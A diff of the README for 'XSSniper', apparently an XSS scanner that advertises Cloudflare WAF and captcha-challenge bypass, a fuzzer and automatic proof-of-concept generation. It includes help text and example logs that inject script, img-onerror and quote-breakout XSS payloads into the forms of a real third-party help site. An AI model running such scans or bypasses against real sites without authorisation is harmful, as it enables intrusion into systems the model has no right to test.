@@ -9,6 +9,7 @@
 
 - Cloudflare WAF and JS challenge bypass with user-agent rotation and cloudscraper
 - Finds potentially vulnerable JavaScript code and searches for injection points
+- Built-in fuzzer and crawler
 - Creates a PoC for XSS and tests it automatically
 - Written in Python
 - Lots of payloads
@@ -29,38 +30,42 @@
 
 ```
 python3 XSSniper.py --help
-Loaded 138 payloads from 'payloads.txt'.
-usage: XSSniper [-h] [-c COOKIE] [-l LOGFILE] [--poc [POC]] [--no-cookies] [--keep-going] [--delay DELAY] url
+usage: XSSniper.py [-h] [-c COOKIE] [-o OUTPUT_DIR] [--log LOG] [--headless] [--poc] [-f FORMS] [--keep-going] [--delay DELAY] [-v] url
+
+XSSniper - A XSS scanner with WAF bypass features
 
 positional arguments:
-  url                   Target URL
+  url                   Target URL (include http(s)://)
 
 options:
   -h, --help            show this help message and exit
-  -c, --cookie COOKIE   Cookie header
-  -l, --logfile LOGFILE
-  --poc [POC]           Enter PoC mode (optionally supply a JSON file path)
-  --no-cookies          Clear cookies per payload injection
-  --keep-going          Continue testing all injection points after finding XSS
-  --delay DELAY         Delay in seconds after page load before testing (default: 5)
+  -c, --cookie COOKIE   Optional cookie header
+  -o, --output-dir OUTPUT_DIR
+                        Directory for outputs
+  --log LOG             Log file path
+  --headless            Run browser headless
+  --poc                 Enable PoC mode (requires prior scan)
+  -f, --forms FORMS     Comma-separated form 'name' values for PoC (default: all)
+  --keep-going          Continue tests after first PoC found
+  --delay DELAY         Seconds to wait after page load
+  -v, --verbose         Verbose console logging
 ```
 <!-- EXAMPLE -->
 ### Example:
 
 ```
-python3 XSSniper.py https://www.help.tinder.com --poc
-Loaded 138 payloads from 'payloads.txt'.
-[DEBUG] Using User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.54 Safari/537.36
-2025-07-07 16:26:41,332 [INFO] Loaded 200 injection points.
-2025-07-07 16:26:41,333 [INFO] Running PoC tests in normal mode. Keep going: False. Delay: 5s
-[DEBUG] Using User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
-2025-07-07 16:26:54,861 [INFO] Detected 2 forms.
-2025-07-07 16:27:06,057 [INFO] Injecting payload '<script>alert("XSS by Nemesis")</script>' into element <input type='hidden' name='utf8'>
-2025-07-07 16:27:06,136 [INFO] Injecting payload '<script>alert("XSS by Nemesis")</script>' into element <input type='search' name='query'>
-2025-07-07 16:27:24,741 [INFO] Injecting payload '"<img src=x onerror=alert("XSS by Nemesis")>' into element <input type='hidden' name='utf8'>
-2025-07-07 16:27:24,826 [INFO] Injecting payload '"<img src=x onerror=alert("XSS by Nemesis")>' into element <input type='search' name='query'>
-2025-07-07 16:27:44,072 [INFO] Injecting payload '';alert("XSS by Nemesis")//' into element <input type='hidden' name='utf8'>
-2025-07-07 16:27:44,138 [INFO] Injecting payload '';alert("XSS by Nemesis")//' into element <input type='search' name='query'>
+python3 XSSniper.py https://www.help.tinder.com --poc -v
+2025-07-08 14:48:48 [INFO] [*] Testing https://www.help.tinder.com via requests...
+2025-07-08 14:48:49 [WARNING] Request test failed (Blocked by Cloudflare or similar); trying cloudscraper...
+2025-07-08 14:48:50 [WARNING] Cloudscraper also blocked; launching browser for manual captcha solution.
+2025-07-08 14:48:50 [INFO] Please solve the captcha in the opened browser. Then return here and press Enter to continue.
+Press Enter after solving captcha in the browser...
+2025-07-08 14:49:01 [INFO] Using User-Agent from browser: Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.98 Mobile/15E148 Safari/604.1
+2025-07-08 14:49:03 [INFO] [PoC] Scanning https://www.help.tinder.com
+2025-07-08 14:49:07 [INFO] Testing form action:search_0
+2025-07-08 14:49:15 [DEBUG] No alert for payload <script>alert("XSS by Nemesis")</script> on form action:search_0
+2025-07-08 14:49:24 [DEBUG] No alert for payload "<img src=x onerror=alert("XSS by Nemesis")> on form action:search_0
+2025-07-08 14:49:33 [DEBUG] No alert for payload ';alert("XSS by Nemesis")// on form action:search_0
 ```
 
 <!-- LICENSE -->
